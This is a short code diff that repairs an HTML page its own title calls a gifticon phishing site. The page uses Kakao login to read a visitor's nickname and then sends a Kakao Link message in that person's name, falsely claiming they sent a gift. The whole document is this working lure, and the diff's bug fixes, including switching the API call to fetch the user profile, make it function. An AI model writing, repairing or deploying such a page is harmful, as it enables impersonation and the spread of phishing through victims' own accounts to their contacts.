@@ -3,7 +3,7 @@
 <html>
     <head>
         <title>기프티콘 낚시 사이트</title>
-        <meta charset="utf-8/">
+        <meta charset="utf-8" />
         <script src="./kakao.js"></script>
     </head>
     <body>
@@ -14,11 +14,11 @@
             Kakao.Auth.login({
                 success: function(response) {
                     Kakao.API.request({
-                        url: '/v1/user/unlink',
+                        url: '/v2/user/me',
                         success: function(response) {
                             let nickname = response['properties']['nickname'];
                             Kakao.Link.sendCustom({
-                                templateId:  65171,
+                                templateId: 65171,
                                 templateArgs: {
                                     'title': nickname + '님이 선물과 메세지를 보냈습니다.',
                                     'desc': '자세한 내용은 선물함에서 확인해 주세요.',
@@ -40,4 +40,4 @@
             });
         </script>
     </body>
-<html>
+</html>
